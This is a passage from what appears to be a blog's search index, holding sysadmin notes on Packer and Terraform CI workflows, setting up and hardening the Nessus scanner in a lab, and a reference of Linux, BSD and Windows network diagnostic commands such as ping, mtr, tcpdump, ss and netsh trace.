ubuntu-latest\n    name: Run Packer\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v5\n\n      - name: Setup `packer`\n        uses: hashicorp/setup-packer@main\n        id: setup\n        with:\n          version: ${{ env.PRODUCT_VERSION }}\n\n      - name: Run `packer init`\n        id: init\n        run: |\n          packer init .\n\n      - name: Run `packer validate`\n        id: validate\n        run: |\n          packer validate .\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#terraform","title":"Terraform","text":"<p>Overview</p> <p>Terraform is a tool for building, changing, and versioning infrastructure safely and efficiently. Terraform can manage existing and popular service providers as well as custom in-house solutions.</p> <ul> <li>Terraform Install</li> <li>Terraform CLI</li> <li>GitHub Actions: setup-terraform</li> </ul> <p>Install</p> <p>This downloads the HashiCorp GPG key, adds the repo information, and installs <code>terraform</code> on Debian/Ubuntu.</p> <pre><code>wget -O - https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg\necho \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main\" | sudo tee /etc/apt/sources.list.d/hashicorp.list\nsudo apt update &amp;&amp; sudo apt install terraform\n</code></pre> <p>For reference, this is the current HashiCorp GPG key data:</p> <pre><code>pub   rsa4096/0xAA16FCBCA621E701 2023-01-10 [SC] [expires: 2028-01-09]\n      Key fingerprint = 798A EC65 4E5C 1542 8C8E  42EE AA16 FCBC A621 E701\nuid                             HashiCorp Security (HashiCorp Package Signing) &lt;security+packaging@hashicorp.com&gt;\nsub   rsa4096/0x706E668369C085E9 2023-01-10 [S] [expires: 2028-01-09]\n</code></pre> <p>Usage</p> <p>Initialize a working directory for validation without accessing any configured backend, use:</p> <pre><code>terraform init -backend=false\n</code></pre> <p>Format the Terraform templates. Rewrites Terraform config files to canonical format. Run this after making edits to your templates or as part of CI/CD.</p> <pre><code>terraform fmt\n</code></pre> <p>Validate the Terraform templates. Run this after making edits to your templates or as part of CI/CD.</p> <pre><code>terraform validate [options]\n</code></pre> <p>GitHub Actions</p> <pre><code># .github/workflows/packer.yml\n\n# Taken from:\n# https://github.com/hashicorp/setup-packer\n\nname: terraform\n\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\n\njobs:\n  terraform:\n    runs-on: ubuntu-latest\n    name: Run Terraform\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v5\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Terraform fmt\n        id: fmt\n        run: terraform fmt -check\n        continue-on-error: true\n\n      - name: Terraform Init\n        id: init\n        run: terraform init -input=false\n\n      - name: Terraform Validate\n        id: validate\n        run: terraform validate -no-color\n</code></pre>"},{"location":"blog/2022/08/29/material-magnify-scan-nessus/","title":"Nessus","text":"<p>What does this post cover?</p> <p>Nessus is possibly the most well-known vulnerability scanner out there. It was originally open source before going closed source / commercial. At that point, development split off into the OpenVAS project.</p> <p>Having tried OpenVAS first, after configuring and setting it up, it was clear when moving over to Nessus, that also had similar processes to install and configure it. For example, back when these notes were taken, the web interface was accessible from any network interface by default (this still appears to be the case). There's also a setting related to checking the signatures of the scanner plugins after downloading which wasn't often talked about.</p> <p>Installing Nessus regularly was more or less required for a number of pentesting courses, so this page was created to document those steps a long time ago. This is just a port of those notes with some review of the currrent documentation.</p> <p>Snapshot in Time</p> <p>These are my notes from 2022 and earlier on setting up Nessus in a lab environment. They may be outdated, and were only checked against the latest documentation when porting to this blog post. They have not been tested.</p>"},{"location":"blog/2022/08/29/material-magnify-scan-nessus/#install","title":"Install","text":"<ul> <li>https://www.tenable.com/products/nessus</li> <li>Download</li> <li>Documentation</li> </ul> <pre><code>sudo dpkg -i ./Nessus-10.5.1-debian10_amd64.deb\n# or\nsudo apt install ./Nessus-10.5.1-debian10_amd64.deb\n</code></pre> <p>You can start the Nessus Scanner by typing <pre><code>sudo /bin/systemctl start nessusd.service\n/bin/systemctl is-active nessusd\n# or\nsudo /etc/init.d/nessusd start\n</code></pre></p> <p>Then go to <code>https://&lt;hostname&gt;:8834/</code> to complete the initial setup.</p> <p>Nessus Essentials Registration</p> <p>You can easily re-register a Nessus Essentials Trial directly from the application if you need a new one / or reinstalled Nessus.</p>"},{"location":"blog/2022/08/29/material-magnify-scan-nessus/#configure","title":"Configure","text":"<p>https://docs.tenable.com/nessus/Content/ConfigureNessus.htm</p> <p>It's recommended to configure which interface address <code>nessusd</code> accepts connectons on:</p> <pre><code>sudo /opt/nessus/sbin/nessuscli fix --secure --set listen_address=127.0.0.1\n</code></pre> <p>By default, the web interface binds to all network interfaces.</p> <p>Alternatively you can set the listening address from the WebUI under settings/advanced, as sometimes the <code>nessuscli</code> won't work.</p> <p>Apply configuration changes:</p> <pre><code>sudo systemctl restart nessusd.service\n</code></pre> <p>Review all advanced settings:</p> <pre><code>sudo nessuscli fix --show\n</code></pre> <p>Plugin Signature Checking</p> <p>Ensure <code>nasl_no_signature_check</code> = <code>FALSE</code> (or no). This requires all nasl files downloaded to be valid and signed by Tenable.</p> <p>https://www.tenable.com/plugins/nessus/179042</p>"},{"location":"blog/2022/08/29/material-magnify-scan-nessus/#updating","title":"Updating","text":"<p>Update both the nessus core components and scanner plugins:</p> <pre><code>sudo systemctl stop nessusd.service\nsudo /opt/nessus/sbin/nessuscli update --all\nsudo systemctl start nessusd.service\n</code></pre> <p>This means you can install a recent version of the <code>.deb</code> or <code>.rpm</code> binary you may have stored locally, and fetch the latest updates from the cli.</p>"},{"location":"blog/2022/08/29/material-magnify-scan-nessus/#nessuscli","title":"nessuscli","text":"<p>Nessuscli</p> <p>A command line tool exists under <code>/opt/nessus/sbin/nessuscli</code> on Linux to run and administer Nessus.</p> <p>https://docs.tenable.com/nessus/Content/NessusCLI.htm</p> <p>The majority of this section was taken from the documentation (linked above) based on what commands appeared to be the most useful or important to remember for setup or regular use in a lab scenario.</p> <p>General usage:</p> <pre><code>nessuscli &lt;command&gt; [&lt;options&gt;]\nnessuscli &lt;command&gt; help\n</code></pre> <p>Bug Reporting Commands:</p> <pre><code>bug-report-generator\nbug-report-generator --quiet [--full] [--scrub]\n</code></pre> <p>User Commands:</p> <pre><code>rmuser [username]\nchpasswd [username]\nadduser [username]\nlsuser\n</code></pre> <p>Fix Commands:</p> <pre><code># Lists all possible settings\nfix --show\n\n# To navigate and modify the settings\nfix [--secure] --list\nfix [--secure] --set &lt;name=value&gt;\nfix [--secure] --get &lt;name&gt;\nfix [--secure] --delete &lt;name&gt;\n</code></pre> <p>Backup Tool (backs up your Nessus settings, not scan data):</p> <pre><code>backup --create &lt;/path/to/filename&gt;\nbackup --restore &lt;/path/to/filename&gt;\n</code></pre> <p>Software Update Commands:</p> <pre><code>update\nupdate --all\nupdate --plugins-only\nupdate &lt;plugin archive&gt;\n</code></pre>"},{"location":"blog/2022/08/29/material-magnify-scan-nessus/#scanning","title":"Scanning","text":"<p>https://docs.tenable.com/nessus/Content/Scans.htm</p> <p>Setting the Source IP</p> <ul> <li>Settings &gt; Miscilleneous &gt; Scan Source IP(s)</li> <li>Source IPs to use when running on a multi-homed host. If multiple IPs are provided, Nessus will cycle through them whenever it performs a new connection.</li> </ul> <p>Port Ranges</p> <ul> <li>Port ranges can be specified like with <code>nmap</code></li> <li>80-5000</li> <li>22,25,80,445,8080</li> </ul> <p>Pause / Abort</p> <ul> <li>Pausing a scan will abort it if you sign out before resuming</li> </ul>"},{"location":"blog/2022/08/29/material-magnify-scan-nessus/#results","title":"Results","text":"<p>You can disable grouping to display findings individually (rather than sets of vulnerabilities in groups like \"MIXED\" or \"CRITICAL\").</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/","title":"Network Commands","text":"<p>This post is meant to be a single point of reference for all of the random ways of interacting with and diagnosing network(s) from a machine.</p> <p>It was started after spending a significant amount of time working in packer, across both the Debian and Red Hat family OS's. There are so many ways to handle networking it's hard to remember these notes when I don't have access to them, and each tool had a dedicated page that has been built upon for 5+ years. Porting each of these notes to this page is an opportunity to clean up, review, and expand on each tool (and add new ones).</p> <p>As of the latest update, this includes Linux (Debian / RedHat), BSD (pfSense), and Windows.</p> <p>Each tool or section is presented with a quick overview of the tool, how to install it if that's ever necessary, and a set of useful examples starting with what I feel is the most practical command structure(s) to know as go-to's, followed by arbitrary useful and expanded examples.</p> <p>AI Usage</p> <p>Some code snippets and concepts were originally discovered by conversing with ChatGPT, in many cases either o1-preview or 4o. These were always validated by sourcing the official documentation and testing any examples shared.</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#ping","title":"ping","text":"<p>The ping Command</p> <p>The <code>ping</code> command is one of the most basic but useful tools to test network connectivity, reliability, and name resolution. It works by sending ICMP echo request packets to a specified host and waiting for a reply. It's available by default on nearly all Unix-like systems and is built-in to Windows as ping.exe.</p> <p>References:</p> <ul> <li>https://github.com/iputils/iputils/</li> <li>https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ping</li> <li>https://developers.google.com/speed/public-dns/docs/troubleshooting</li> <li>https://en.wikipedia.org/wiki/Ping_(networking_utility)</li> </ul> <p>Reading ping Output</p> <p>Ping is meant to be a connectivity and diagnostic tool. Sometimes you'll need to use it to determine the frequency of connectivity drops in a network. This makes more sense if you run ping for a number of minutes before reviewing the results.</p> <pre><code>$ ping -I lo 127.0.0.1\nPING 127.0.0.1 (127.0.0.1) from 127.0.0.1 lo: 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.057 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.049 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.049 ms\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.056 ms\n^C\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3077ms\nrtt min/avg/max/mdev = 0.049/0.052/0.057/0.003 ms\n</code></pre> <p>This resuls in two summary lines:</p> <ul> <li>Packets sent, and how many were lost</li> <li><code>min/avg/max/mdev</code> is showing you the latency statistics</li> </ul> <p>The TTL can indicate the type of operating system:</p> <ul> <li>*nix systems often have <code>ttl=64</code></li> <li>Windows often has <code>ttl=128</code></li> </ul> <p>Installation </p> <pre><code># On Ubuntu ping is part of the iputils package and installed by default\nsudo apt install -y iputils-ping\n</code></pre> <p>Practical Usage </p> <p>Ping a hostname or IP address until <code>Ctrl+c</code> canceled:</p> <pre><code>ping example.com\nping 1.1.1.1\nping fe80::abcd:ef01:2345:1234%enp1s0\n</code></pre> <pre><code>ping.exe /t 192.168.1.1\n</code></pre> <p>Set a maximum number of ping packets to send:</p> <pre><code>ping -c 4 example.com\n</code></pre> <pre><code>ping.exe /n 4 example.com\n</code></pre> <p>Count on Linux</p> <p>Linux by default will ping forever if <code>-c &lt;number&gt;</code> isn't set. The default behavior on Windows is to send 4 pings.</p> <p>Set the source interface, interface is either an address, an interface name or a VRF name (Linux only):</p> <pre><code>ping -I eth0 google.com\nping -I 10.40.8.182 google.com\n</code></pre> <p>This is an easy way to obtain a public IPv6 address to ping:</p> <pre><code>dig @1.1.1.1 google.com -t AAAA +tls +short\n</code></pre> <p>Request reverse name resolution (Windows only):</p> <pre><code>ping.exe /a 1.1.1.1\n</code></pre> <p>Expanded Usage </p> <p>Set the TTL of a ping packet:</p> <pre><code>ping -t 128 example.com\n</code></pre> <pre><code>ping.exe /i 128 example.com\n</code></pre> <p>TTL Details</p> <p>The TTL value of an IP packet represents the maximum number of IP routers that the packet can go through before being thrown away. In current practice you can expect each router in the Internet to decrement the TTL field by exactly one.</p> <p>This summary is directly from the <code>ping</code> manpage.</p> <p>Set the interval between packets sent (in seconds):</p> <pre><code>ping -i 5 example.com\n</code></pre> <pre><code>ping.exe /i 5 example.com\n</code></pre> <p>Set the packet size (in bytes), default=64, 8 for the ICMP header + 56:</p> <pre><code>ping -s 1337 example.com\n</code></pre> <pre><code>ping.exe /l 1337 example.com\n</code></pre> <p> See also: Ping of Death</p> <p>Ping flood (requires root):</p> <ul> <li>For every ECHO_REQUEST sent a period <code>.</code> is printed</li> <li>For every ECHO_REPLY received a backspace is printed</li> </ul> <pre><code>sudo ping -f 10.0.0.1\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#tracepath","title":"tracepath","text":"<p>tracepath</p> <p>Effectively <code>traceroute</code>, but without any special options and does not require root privileges.</p> <p>It traces the network path to destination discovering MTU along this path. It uses UDP port <code>&lt;port&gt;</code> or some random port.</p> <p>References:</p> <ul> <li>https://github.com/iputils/iputils/</li> <li>traceroute vs tracepath</li> </ul> <p>Installation </p> <pre><code># tracepath is often installed by default on Ubuntu\nsudo apt install -y iputils-tracepath\n</code></pre> <p>Practical Usage </p> <p>Trace a network path and print both, hostnames and IP addresses:</p> <pre><code>tracepath -b google.com\ntracepath -b 10.0.0.1\n</code></pre> <p>Do not resolve hostnames:</p> <pre><code>tracepath -n 1.1.1.1\n</code></pre> <p>Set an initial destination port:</p> <pre><code>tracepath -p 8000 192.168.40.22\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#traceroute","title":"traceroute","text":"<p>traceroute</p> <p>Traces the route taken by packets over a network.</p> <p>References:</p> <ul> <li>https://www.gnu.org/software/inetutils/manual/inetutils.html#traceroute-invocation</li> <li>https://packages.debian.org/bookworm/inetutils-traceroute</li> <li>traceroute vs tracepath</li> </ul> <p>See also:</p> <ul> <li>tcptraceroute</li> </ul> <p>Installation </p> <p>If you try to run <code>traceroute</code> on Ubuntu when it's not installed, you'll get:</p> <pre><code># Command 'traceroute' not found, but can be installed with:\n# sudo apt install inetutils-traceroute  # version 2:2.2-2ubuntu0.1, or\n# sudo apt install traceroute            # version 1:2.1.0-2\n</code></pre> <p>See traceroute vs inetutils-traceroute.</p> <p>Install one of them with:</p> <pre><code>sudo apt install -y traceroute\n\n# GNU version\nsudo apt install -y inetutils-traceroute\n</code></pre> <p>traceroute is often not installed by default on Linux systems like <code>ping</code> is. Instead, you may find <code>tracepath</code> or <code>mtr</code>.</p> <p>Practical Usage </p> <pre><code>traceroute example.com\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#tracert","title":"tracert","text":"<p>tracert</p> <p>tracert.exe is a Windows tool.</p> <p>This diagnostic tool determines the path taken to a destination by sending Internet Control Message Protocol (ICMP) echo Request or ICMPv6 messages to the destination with incrementally increasing time to live (TTL) field values.</p> <p>To trace a path and provide network latency and packet loss for each router and link in the path, use the <code>pathping.exe</code> command.</p> <ul> <li>https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tracert</li> </ul> <p>Practical Usage </p> <p>Trace the path to a host:</p> <pre><code>tracert www.microsoft.com\n</code></pre> <p>Do not attempt name resolution:</p> <pre><code>tracert /d www.microsoft.com\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#mtr","title":"mtr","text":"<p>My Traceroute</p> <p><code>mtr</code> (My Traceroute) combines the functionality of the <code>traceroute</code> and <code>ping</code> programs into a single network diagnostic tool.</p> <ul> <li>https://github.com/traviscross/mtr</li> <li>Red Hat: How to use the Linux mtr command </li> </ul> <p>Installation </p> <pre><code># CLI + GUI tool\nsudo apt install -y mtr\n\n# CLI version only, installed by default on Ubuntu\nsudo apt install -y mtr-tiny\n\n# RedHat/Fedora\nsudo dnf install mtr\n\n# macOS (Homebrew)\nbrew install mtr\n</code></pre> <p>Available manpages:</p> <pre><code>man mtr\nman mtr-packet\n</code></pre> <p>Practical Usage </p> <p>Start an interactive (curses-based) trace using an <code>-I</code> interface, include <code>-b</code> IPs and hostnames:</p> <pre><code>mtr -I enp1s0 -b example.com\n</code></pre> <p>Run a trace for <code>-c 20</code> pings, that prints <code>-r</code> results to the terminal, for optional redirection to a file:</p> <pre><code>mtr -I enp1s0 -b -c 20 -r 192.168.0.1\n</code></pre> <p><code>-c</code> is not very useful for interactive mode as the curses interface auto-quits after reaching the count limit, and you'll lose the visibile results.</p> <p>Output Formats</p> <p><code>mtr</code> has a number of useful output formats:</p> <ul> <li><code>--csv</code></li> <li><code>--json</code></li> <li><code>--xml</code></li> </ul> <p>These are invoked separately from <code>-r</code> / <code>-w</code> report modes, which prints the default output format to your console non-interactively.</p> <p>Do not do name resolution:</p> <pre><code>mtr -n example.com\n</code></pre> <p>Expanded Usage </p> <p>Destination Port Options</p> <p><code>mtr</code> has some really interesting destination port options (taken directly from the manpage):</p> <p><code>-u</code>, <code>--udp</code></p> <p>Use UDP datagrams instead of ICMP ECHO.</p> <p><code>-T</code>, <code>--tcp</code></p> <p>Use TCP SYN packets instead of ICMP ECHO.  PACKETSIZE is ignored, since SYN packets  can not contain data.</p> <p><code>-S</code>, <code>--sctp</code></p> <p>Use Stream Control Transmission Protocol packets instead of ICMP ECHO.</p> <p><code>-P PORT</code>, <code>--port PORT</code></p> <p>The target port number for TCP/SCTP/UDP traces.</p> <p><code>-L LOCALPORT</code>, <code>--localport LOCALPORT</code></p> <p>The source port number for UDP traces.</p> <p><code>-Z SECONDS</code>, <code>--timeout SECONDS</code></p> <p>The  number  of  seconds  to keep probe sockets open before giving up on the connection. Using large values for this, especially combined with a short interval, will  use  up  a lot of file descriptors.</p> <p><code>-M MARK</code>, <code>--mark MARK</code></p> <p>Set the mark for each packet sent through this socket similar to the netfilter MARK target but socket-based.  MARK is 32 unsigned integer.  See socket(7) for full  description of this socket option</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#tcpdump","title":"tcpdump","text":"<p>tcpdump</p> <p>The standard command-line network traffic analyzer. It's an excellent tool for monitoring, debugging, troubleshooting, or creating network capture files for later analysis.</p> <p>Website: https://www.tcpdump.org/</p> <p>If you're looking for an alternative, it's likely <code>tshark</code>.</p> <p>Installation </p> <pre><code># Debian / Ubuntu\nsudo apt install -y tcpdump\n</code></pre> <p>Daniel Miessler's cheat sheet on tcpdump should be your first stop.</p> <p>Practical Usage </p> <p>Monitor all traffic crossing interface <code>-i eth0</code>, dropping process privileges to <code>nobody</code>:</p> <pre><code>sudo tcpdump -i eth0 -n -vv -Z nobody\n</code></pre> <p>Useful Options</p> <p>Essentials:</p> <ul> <li>Use <code>-D</code> to list available interfaces</li> <li>Use <code>-n</code> to prevent name resolution</li> <li>Use <code>-nn</code> to prevent name resolution and port resolution</li> <li>Use <code>-v[vv]</code> to increase verbosity in output, such as what gets decoded</li> <li>Use <code>-Q [in|out]</code> to specify direction</li> <li>Use <code>-Z USER</code> to drop prvilieges to those of USER, often <code>nobody</code> or <code>tcpdump</code><ul> <li>Ensure USER can write to the output directory</li> <li>It's recommended to use a limited privilege user like <code>nobody</code> or <code>tcpdump</code> for ongoing capture processes</li> </ul> </li> </ul> <p>Console Output:</p> <ul> <li><code>-A</code> to print ASCII data</li> <li><code>-X[X]</code> to print hex and ASCII data (similar to Wireshark)</li> </ul> <p>File Output:</p> <ul> <li><code>-w FILE</code> write data to a pcap file instead of stdout, can use a strftime(3) fromatted datetime string<ul> <li>Example: <code>-w $(hostname -s).%Y%m%d%H%M%S.pcap</code></li> <li>For commands executing as systemd service tasks, use double <code>%%</code> escaping: <code>$(hostname -s).%%Y%%m%%d%%H%%M%%S.pcap</code></li> </ul> </li> <li><code>-r FILE</code> reads a file written with <code>-w FILE</code></li> <li><code>-G SECONDS</code> rotates the <code>-w</code> written FILE every SECONDS<ul> <li>Overwrites the FILE if a strftime(3) fromatted datetime string isn't used</li> </ul> </li> <li><code>-C SIZE</code> used with <code>-w FILE</code>, rotates files based on SIZE, appending an integer to the FILE string each time</li> </ul> <p>Much of this is summarized from the tcpdump manpage.</p> <p>Expanded Usage </p> <p>For the expression syntax, see <code>man pcap-filter</code>.</p> <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#tshark","title":"tshark","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#pktmon","title":"pktmon","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#ipconfig","title":"ipconfig","text":"<p>ipconfig</p> <p><code>ipconfig</code> is possibly the most well-known Windows utility to obtain your networking information.</p> <p>Displays all current TCP/IP network configuration values and refreshes Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings. Used without parameters, ipconfig displays Internet Protocol version 4 (IPv4) and IPv6 addresses, subnet mask, and default gateway for all adapters.</p> <p>The latest online documentation does a great job showcasing the usage:</p> <ul> <li>https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig</li> </ul> <p>Practical Usage </p> <p>Display all TCP/IP configuration information for all adapters:</p> <pre><code>ipconfig /all\n</code></pre> <p>Release and renew a DHCP lease, either per-adapter or globally:</p> <pre><code>ipconfig /release [&lt;adapter&gt;]\nipconfig /release6 [&lt;adapter&gt;]\nipconfig /renew [&lt;adapter&gt;]\nipconfig /renew6 [&lt;adapter&gt;]\n</code></pre> <p>List the contents of the DNS resolver cache:</p> <pre><code>ipconfig /displaydns\n</code></pre> <p>Flush DNS resolver cache:</p> <pre><code>ipconfig /flushdns\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#arp","title":"arp","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#netstat","title":"netstat","text":"<p>Network Statistics</p> <p>Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.</p> <ul> <li>https://en.wikipedia.org/wiki/Netstat</li> <li>windows-commands/netstat</li> </ul> <p>Installation </p> <p><code>netstat</code> no longer installed on Ubuntu by default, and has been replaced with <code>ss</code>.</p> <pre><code># Ubuntu\nsudo apt install -y net-tools\n</code></pre> <p>Practical Usage </p> <p>Show all TCP/UDP connections, their associated processes, do not resolve IPs, include IPv4 and IPv6.</p> <pre><code># Linux\nsudo netstat -antup\nsudo netstat -anp -A inet,inet6\n\n# BSD\nTO DO\n\n# Windows\nnetstat.exe -a[b]no\n</code></pre> <p>Show fully qualified domain names and port names (Windows only):</p> <pre><code>netstat.exe -f\n</code></pre> <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#ss","title":"ss","text":"<p>Socket Statistics</p> <p><code>ss</code> is used to dump socket statistics. It allows showing information similar to <code>netstat</code>, and in fact is slowly replacing it.  It can display more TCP and state information than other tools.</p> <p><code>ss</code> is part of the <code>iproute2</code> package.</p> <p>Practical Usage </p> <p>Display all \"inet\" (IPv4/6) network connections regardless of state, and the related process, optionally sort by connection state</p> <pre><code>sudo ss -anp -A inet [| sort -k 2 ]| less -S\n</code></pre> <p>Other socket tables</p> <p><code>sudo ss -anp -A all | less -S</code> will display <code>-A all</code> socket tables on the system, inlcuding Unix sockets. This behavior can be controlled with:</p> <p><code>-A QUERY</code>, <code>--query=QUERY</code>, <code>--socket=QUERY</code></p> <p>List of socket tables to dump, separated by commas. The following identifiers are understood: all, inet, tcp, udp, raw, unix, packet, netlink, unix_dgram, unix_stream, unix_seqpacket, packet_raw, packet_dgram, dccp, sctp, vsock_stream, vsock_dgram, and xdp. Any item in the list may optionally be prefixed by an exclamation mark (!) to exclude that socket table from being dumped.</p> <p>Taken from the manpage for <code>ss</code>.</p> <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#sockstat","title":"sockstat","text":"<p>Socket Statistics</p> <p>The sockstat command lists open Internet or Unix domain sockets.</p> <ul> <li>https://man.freebsd.org/cgi/man.cgi?sockstat(1)</li> </ul> <p>Practical Usage </p> <p><code>sockstat</code> is often found on pfSense. This example shows how to enumerate all connections related to the web interface, for exmaple, if hunting webshells:</p> <pre><code>sockstat [-4|-6] | grep nginx\n</code></pre> <p>Taken from the FreeBSD manual:</p> <p>Show information for sockets using either TCP or UDP, if neither, the local nor the foreign addresses are in the loopback network:</p> <pre><code>sockstat -L -P tcp,udp\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#lsof","title":"lsof","text":"<p>List Open Files</p> <p><code>lsof</code> is a command listing open files and the processes opening them.</p> <ul> <li>https://en.wikipedia.org/wiki/Lsof</li> </ul> <p>The manual references file 00QUICKSTART for additional examples. This file has since moved to:</p> <ul> <li>GitHub: lsof docs</li> </ul> <p>Installation </p> <pre><code># Debian / Ubuntu\nsudo apt install lsof\n\n# RHEL / CentOS\nsudo yum install lsof\n\n# Arch\nsudo pacman -Syu lsof\n\n# NixOS\nnix-env -i lsof\n</code></pre> <p>Practical Usage </p> <p>List all files on the filesystem with a network connection, do not convert ports to service names or IPs to hostnames:</p> <pre><code>sudo lsof -i -n -P\n</code></pre> <p>strandjs/IntroLabs</p> <p>This tool was showcased in the Linux CLI section of the SOC Core Skills course by John Strand.</p> <p><code>lsof</code> has a robust tutorial that demonstrates many capabilities one-by-one.</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#route","title":"route","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#netsh","title":"netsh","text":"<p>The Windows Network Shell Utility</p> <p>Netsh is a command-line scripting utility that allows you to display or modify the network configuration of a computer that is currently running. Netsh commands can be run by typing commands at the netsh prompt and they can be used in batch files or scripts. Remote computers and the local computer can be configured by using netsh commands.</p> <ul> <li>Netsh Command Reference</li> <li>Netsh Trace Commands</li> <li>To convert etl capture files to pcaps, see: https://github.com/microsoft/etl2pcapng</li> </ul> <p>Practical Usage </p> <p><code>netsh</code> itself has numerous subcommands. This section will grow over time as more are added.</p> <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p> <p>Trace </p> <p>The command reference pages have a number of examples somewhat scattered throughout the entire page, and they leave off <code>netsh trace</code> when demonstrating usage which can be hard to see if you're not looking for it.</p> <p>The easiest way to see options available per-subcommand:</p> <pre><code>netsh trace /?\nnetsh trace &lt;cmd&gt; /?\n</code></pre> <p>Credit to these examples for demonstrating further usage:</p> <ul> <li>Microsoft Answers: Netsh Trace to Capture Packets Only</li> <li>etl2pcapng README</li> <li>Microsoft Docs: Files Rendered by Trace</li> </ul> <p>Start a capture, they will run as a process in the background:</p> <pre><code>netsh trace start capture=yes report=disabled tracefile=.\\NetTrace.etl maxsize=16384\n</code></pre> <p>View the status of a running capture</p> <pre><code>netsh trace show status\n</code></pre> <p>Stop a trace:</p> <pre><code>netsh trace stop\n</code></pre> <p>Event tracing can be also used across reboots with <code>persistent=yes</code>:</p> <pre><code>netsh trace start capture=yes report=disabled persistent=yes tracefile=.\\NetTrace.etl maxsize=16384\n</code></pre> <p>Convert to pcap format:</p> <pre><code>etl2pcapng.exe .\\NetTrace.etl .\\NetTrace.pcapng\n</code></pre> <p>Use filters, see all available with <code>netsh trace show CaptureFilterHelp</code>:</p> <pre><code>netsh trace start capture=yes report=disabled Ethernet.Type=IPv6 IPv6.Address=fe80::1234:5678:abcd\\%8 tracefile=.\\NetTrace.etl maxsize=16384\n</code></pre> <p>Use a scenario for troubleshooting:</p> <pre><code>netsh trace start capture=yes report=disabled scenario=VPNServer tracefile=.\\NetTrace.etl\n</code></pre>"},{"location":"blog/2025/04/18/material-console-network-network-commands/#ip","title":"ip","text":"<p>The ip Command</p> <p>Show or manipulate routing, network devices, interfaces and tunnels.</p> <p><code>ip</code> is meant as a more feature-rich replacement to <code>ifconfig</code> and <code>route</code>, which are being deprecated. This is similar to <code>iw</code> replacing <code>iwconfig</code>.</p> <p>Much of this information was gleaned and adapted from Ubuntu's server documentation.</p> <p>References:</p> <ul> <li>Main Project Page and Source Code</li> <li>Ubuntu Server: Configuring Networks</li> </ul> <p>Installation </p> <p>iproute2 is usually shipped in a package called iproute or iproute2 and consists of several tools, of which the most important are <code>ip</code> and <code>tc</code>.</p> <pre><code># Debian / Ubuntu\nsudo apt install -y iproute2\n</code></pre> <p>manpages</p> <p>If you want to see the built in examples, search \"EXAMPLES\" under the <code>man</code> pages:</p> <pre><code>man ip\nman ip-address\nman ip-link\nman ip-route\n</code></pre> <p>Interestingly if you read both manpages for <code>ping</code> or <code>tracepath</code> and <code>ip</code>, you'll see they were originally written by the same author.</p> <p>Practical Usage </p> <p>Get information (basics):</p> <pre><code>ip addr      # Protocol address info\nip link      # Network device info\nip route     # Route info\nip -6 &lt;cmd&gt;  # IPv6 equivalent command\n</code></pre> <p>Nearly all of the <code>ip</code> commands can be abbreviated, so <code>ip address</code> is the same as <code>ip addr</code> which is the same as <code>ip a</code>.</p> <p>Get information (expanded):</p> <pre><code>ip address show up\nip link show dev ens33\n</code></pre> <p>Changes are Temporary</p> <p>The majority of the changes and settings you can make with the <code>ip</code> command(s) are not persistent across reboots. These often require (on modern systems) a netplan configuration.</p> <p>See also: https://netplan.readthedocs.io/en/stable/netplan-yaml/#</p> <p>Add / delete default gateway (route to any):</p> <pre><code>sudo ip route add default via &lt;gateway-ip&gt;\nsudo ip route del default via &lt;gateway-ip&gt;\n</code></pre> <p>Add / delete a defined static route (route to a subnet):</p> <pre><code>sudo ip route add &lt;dst-net&gt; via &lt;gateway-ip&gt; dev &lt;dev&gt;\nsudo ip route add 192.168.1.0/24 via 10.0.0.1 dev eth0\nsudo ip route delete 192.168.1.0/24 via 10.0.0.1 dev eth0\n</code></pre> <p>Add / delete an interface:</p> <pre><code>sudo ip link add dev eth2 type bridge\nsudo ip link del dev eth2\n</code></pre> <p>Adding Interfaces</p> <p>Say you have <code>eth0</code>. To truly add another interface, for instance an <code>eth1</code>, you would need another NIC attached to the device.</p> <p>In other words, the only interfaces you'd be creating with this command are virtual or bridged or 